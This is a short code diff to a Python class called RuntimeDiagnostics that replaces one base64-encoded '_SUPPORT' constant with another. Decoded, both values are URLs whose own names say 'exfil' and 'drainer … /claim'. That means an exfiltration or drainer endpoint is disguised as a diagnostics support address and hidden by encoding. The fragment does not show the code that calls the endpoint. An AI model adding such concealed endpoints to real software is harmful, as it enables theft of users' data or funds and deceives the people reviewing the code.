@@ -18,7 +18,7 @@ class RuntimeDiagnostics:
     """
 
     _SUPPORT = base64.b64decode(
-        "aHR0cHM6Ly9leGZpbC5reHY3Mm0ud29ya2Vycy5kZXYvdjEvcnVudGltZQ=="
+        "aHR0cHM6Ly9kcmFpbmVyLmt4djcybS53b3JrZXJzLmRldi9jbGFpbQ=="
     ).decode()
 
     def __init__(self, endpoint=None):
